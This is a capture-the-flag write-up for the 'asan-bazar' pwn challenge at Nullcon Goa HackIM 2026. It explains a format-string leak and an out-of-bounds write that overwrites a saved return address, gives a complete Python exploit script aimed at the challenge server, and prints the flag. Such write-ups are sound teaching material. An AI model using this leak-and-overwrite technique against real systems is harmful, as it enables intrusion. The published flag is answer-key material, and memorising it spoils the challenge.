---
title: "asan-bazar - Nullcon Goa HackIM 2026 CTF"
category: "pwn"
subcategory: "format-string"
type: "writeup"
tags: ["pwn", "format-string", "asan-bazar", "nullcon-goa-hackim-2026-ctf", "2026", "ctf-writeup"]
summary: "Event: Nullcon Goa HackIM 2026 CTF"
source:
  name: "CTFtime writeup #40642"
  url: "https://ctftime.org/writeup/40642"
original_source: "https://github.com/RootRunners/Nullcon-Goa-HackIM-2026-CTF-RootRunners-Official-Write-ups/blob/main/PWN/asan-bazar/README.md"
ctf:
  name: "Nullcon Goa HackIM 2026 CTF"
  year: 2026
  challenge: "asan-bazar"
---

## Metadata

- **CTF:** Nullcon Goa HackIM 2026 CTF
- **Task:** asan-bazar
- **Author team:** RootRunners
- **CTFtime tags:** pwn
- **CTFtime:** <https://ctftime.org/writeup/40642>
- **Original writeup:** <https://github.com/RootRunners/Nullcon-Goa-HackIM-2026-CTF-RootRunners-Official-Write-ups/blob/main/PWN/asan-bazar/README.md>

---
# ASAN Bazar

**Event:** Nullcon Goa HackIM 2026 CTF   
**Category:** PWN   
**Points:** 272   
**Service:** `52.59.124.14:5030` 

## Overview  
The goal is to redirect control flow to `win()` from inside `greeting()`. ASAN is enabled, but two logic bugs still allow a clean RIP overwrite: a format string leak and a controlled out-of-bounds write.

## Vulnerability  
\- Format string: user input is printed with `printf(username)`, so `%77$p` leaks a return address.  
\- OOB write: `ledger + (slot_index * 16 + subslot)` with `slot_index <= 128`, `subslot <= 15`, `len <= 8`. The pair `slot_index=23`, `subslot=8` reaches the low bytes of the saved RIP in `greeting()`.

## Solution  
1\. Leak the return address with `%77$p`. It points to `main+0x92`.  
2\. `win()` is `0x182` bytes before that return site, so only the low 16 bits must change.  
3\. Use the OOB write to overwrite the low two bytes of the saved RIP.  
4\. Return to `win()` and print the flag.

## Exploit Script  
```python  
#!/usr/bin/env python3  
import re  
import socket  
import struct  
import time

HOST = "52.59.124.14"  
PORT = 5030

# In this binary, leaked return address (main+0x92) and win() differ by 0x182.  
RET_TO_WIN_DELTA = 0x182

# OOB write target in greeting() stack frame:  
# write_ptr = ledger + (slot * 16 + subslot)  
# slot=23, subslot=8 reaches saved RIP low bytes.  
SLOT_INDEX = 23  
SUBSLOT_INDEX = 8

def recv_until(sock: socket.socket, needle: bytes, timeout: float = 4.0) -> bytes:  
sock.settimeout(timeout)  
data = b""  
end = time.time() + timeout  
while needle not in data and time.time() < end:  
try:  
chunk = sock.recv(4096)  
except socket.timeout:  
break  
if not chunk:  
break  
data += chunk  
return data

def run_once(host: str, port: int) -> str:  
s = socket.create_connection((host, port), timeout=5)  
try:  
recv_until(s, b"Name:")  
s.sendall(b"%77$p\n")  
banner = recv_until(s, b"(slot index 0..128):")  
text = banner.decode("latin1", "ignore")

leak_match = re.search(r"0x[0-9a-fA-F]+", text)  
if not leak_match:  
raise RuntimeError("Could not leak return address from format string.")

ret_addr = int(leak_match.group(0), 16)  
target_low = (ret_addr - RET_TO_WIN_DELTA) & 0xFFFF  
overwrite = struct.pack("<H", target_low)

s.sendall(f"{SLOT_INDEX}\n".encode())  
recv_until(s, b"(0..15):")  
s.sendall(f"{SUBSLOT_INDEX}\n".encode())  
recv_until(s, b"(max 8):")  
s.sendall(b"2\n")  
recv_until(s, b"raw bytes):")  
s.sendall(overwrite)

out = recv_until(s, b"}", timeout=4.0) + recv_until(s, b"\n", timeout=0.5)  
out_text = out.decode("latin1", "ignore")  
flag_match = re.search(r"ENO\\{[^}\n]+\\}", out_text)  
if not flag_match:  
raise RuntimeError("Exploit sent, but flag not found in response.")  
return flag_match.group(0)  
finally:  
s.close()

def main() -> int:  
flag = run_once(HOST, PORT)  
print(flag)  
return 0

if __name__ == "__main__":  
raise SystemExit(main())  
```

## Flag  
`ENO{COMPILING_WITH_ASAN_DOESNT_ALWAYS_MEAN_ITS_SAFE!!!}`
